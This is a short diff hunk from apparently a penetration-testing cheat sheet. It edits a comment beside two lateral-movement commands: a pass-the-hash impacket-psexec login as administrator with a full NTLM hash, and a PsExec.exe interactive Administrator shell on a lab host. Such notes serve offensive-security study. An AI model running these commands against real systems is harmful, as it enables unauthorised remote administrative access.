@@ -45,7 +45,7 @@ Password:
 #using local account hash.
 impacket-psexec administrator@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 
-#using PsExec.exe password
+#using PsExec.exe password if sliver ticket and golden ticket.
 .\PsExec.exe \\192.168.154.134 -i -u Administrator cmd.exe
 ```
 
